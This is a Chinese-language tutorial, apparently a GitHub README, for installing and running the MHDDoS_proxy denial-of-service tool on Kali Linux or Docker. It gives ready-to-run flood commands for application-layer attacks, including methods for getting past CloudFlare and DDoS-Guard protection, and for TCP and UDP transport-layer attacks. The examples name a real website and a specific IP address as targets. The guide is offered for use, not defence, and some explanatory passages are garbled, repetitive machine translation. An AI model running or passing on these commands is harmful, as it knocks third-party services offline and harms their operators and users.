![5StepsDDoS-960x640](https://user-images.githubusercontent.com/101450205/159101728-e859a358-8e49-4360-be5a-839280ad74ef.jpg)

# MHDDoS_proxy
像往常一样，我们启动我们的虚拟 Kali Linux 并打开终端。首先，让我们将权限提升到 root 用户并删除旧的 MHDDoS：

sudo su #进入root用户，默认密码为“kali”
rm -rf MHDDoS #删除目录以及所有 MHDDoS 文件
接下来，我们使用以下命令从 github 克隆我们下载的脚本：
git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git

![image](https://user-images.githubusercontent.com/101450205/159101142-947d1a92-5c80-46ff-b22d-0386ccca6aa7.png)

接下来，我们需要下载 requirements.txt 文件，但首先要安装 python3-pip。您可以使用以下简单命令执行此操作：

apt update #构建所有可更新的包
apt install python3-pip #安装需要的包
![image](https://user-images.githubusercontent.com/101450205/159101166-807422fa-08ca-4fef-b625-05d4e640eb1b.png)

当被问到“是或否”时，我们通过输入“Y”来选择“是”

我们正在等待安装完成并继续“调整”MHDDoS

python3 -m pip install -r MHDDoS/requirements.txt

![image](https://user-images.githubusercontent.com/101450205/159101185-8072287d-5621-4977-b1fa-d3354f414b58.png)

MHDDoS，我们现在如何使用它？

攻击第7层（应用层）

例如，如果您知道使用 使用“保护”在 MHDOS 工具中具有一种攻击方法 方法方法中（在 CloudFlare 的 CFB 中使用，在 DDOS-GUARD 的 DGB 中使用），则以中。

VPN ）：

python3 runner.py <目标> --http-methods <方法> -t <威胁> --rpc <连接> -p <更新> --debug

在哪里：

目标格式为https://example.com的链接
方法(--http-methods) – MHDDoS
威胁(-t) - 对目标的恶意请求
连接(--rpc)
您的刷刷器(-p) - 秒此属性为单位单位的属性，之后与段代理服务器的连接将被刷刷代理代理连接服务具以具解除解除的刷刷连接器的连接连接器的属性默认值为 300 秒。
--debug - 样样查看测试日志。

举个例子，我们要攻击这个网站：http://www.baiketextile.cn/

python3 runner.py http://www.baiketextile.cn/ --http-methods dgb -t 1000 --rpc 100 -p 300 --debug

启动后，需要（大约1-2分钟），直到与等待服务器连接。

第4层攻击（传输层，p2p）

如果这是您必须的第一次受攻击的服务层服务层通过这种类型的攻击服务以成功地实现目标同的格式指定：

TCP 攻击（独立 VPN）：

以 tcp://IP:port 格式指定目标，并在 --http-methods

举个例子
python3 runner.py tcp://87.226.162.181:80 -t 1000 -p 300 --rpc 50 --http-methods TCP --debug

对于UDP（需要VPN）：

以 udp://IP:port 格式指定目标，并在 --http-methods

python3 runner.py udp://87.226.162.181:80 -t 1000 -p 300 --rpc 50 --http-methods UDP --debug

你也可以使用docker

docker，你用命令docker启动了MHDDOS_PROXY

第7层：

docker run -it --rm portholeascend/mhddos_proxy 你要攻击的网站 --http-methods dgb -t 1000 --rpc 100 -p 300 --debug

第4层（TCP）：

docker run -it --rm portholeascend/mhddos_proxy tcp://网站ip+端口 -t 1000 -p 300 --rpc 50 --http-methods TCP --debug

第4层（UDP）：

docker run -it --rm portholeascend/mhddos_proxy udp://网站+端口 -t 1000 -p 300 --rpc 50 --http-methods UDP --debug

下载docker

Windows：https://docs.docker.com/desktop/windows/install/
Mac：https://docs.docker.com/desktop/mac/install/
Ubuntu： https://docs.docker.com/engine/install/ubuntu/
Kali Linux： https://www.kali.org/docs/containers/installing-docker-on-kali/

您可以使用以下命令下载最新的 mhddos_proxy 映像：

docker pull portholeascend/mhddos_proxy:latest

本教程由喵哥整理，欢迎关注喵哥TG频道：https://t.me/miaoge123




